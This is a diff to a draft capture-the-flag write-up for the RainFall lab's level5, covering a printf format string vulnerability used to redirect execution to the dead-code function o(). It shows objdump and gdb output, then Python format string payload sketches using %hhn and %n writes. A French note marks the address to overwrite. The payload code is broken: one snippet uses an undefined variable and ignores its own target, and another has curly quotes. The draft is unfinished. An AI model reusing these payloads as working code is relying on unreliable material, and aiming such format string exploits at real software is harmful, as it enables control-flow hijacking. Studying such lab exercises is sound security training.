@@ -1,4 +1,59 @@
 ##	Description
 
-In this level, we have a program that is quite similar to the previous one. The main calls the `n` function, which then gets user input from `stdin` via `fgets`. The buffer is directly printed using `printf` without any format string specified, leading to a format string vulnerability.
+In this level, we have a program that is quite similar to the previous one. The main calls the `n` function, which then gets user input from `stdin` via `fgets`. The buffer is directly printed using `printf` without any format string specified, leading to a format string vulnerability again.
+
+Here instead of changing the value of a variable, we have to load an address to force the instructions to execute a function o() that is otherwise unreachable (dead-code).
+
+```bash
+level5@RainFall:~$ objdump --syms level5 
+
+level5:     file format elf32-i386
+
+SYMBOL TABLE:
+...
+080484a4 g     F .text  0000001e              o
+08049854 g     O .bss   00000004              m
+08049848 g       *ABS*  00000000              __bss_start
+08048504 g     F .text  0000000d              main
+00000000  w      *UND*  00000000              _Jv_RegisterClasses
+08048334 g     F .init  00000000              _init
+```
+
+The function is located at `080484a4`, so this is our address to inject.
+
+```bash
+level5@RainFall:~$ gdb -batch level5 -ex 'disas n'
+Dump of assembler code for function n:
+...
+   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
+   0x080484f8 <+54>:    movl   $0x1,(%esp)
+   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
+End of assembler dump.
+```
+
+from prev level:
+
+python -c 'import struct;
+target=0x8049810;
+payload=struct.pack("<I",m+3)
++ struct.pack("<I",m+2)
++ struct.pack("<I",m)
++ struct.pack("<I",m+1)
++ "%241c%12$hhn%1c%13$hhn%66c%14$hhn%17c%15$hhn";
+print(payload)' | ./level4 >/tmp/token
+
+
+import struct
+ target = 0x080484a4
+ 
+ buffer = “”
+ buffer += struct.pack(“<I”, target)
+ buffer += “%08x” * 5
+ buffer += “B” *41
+ buffer += “%n”
+ 
+ print buffer
+
+
+ 0xbffff62c contient 0x804850f doit contenir 0x080484a4
 
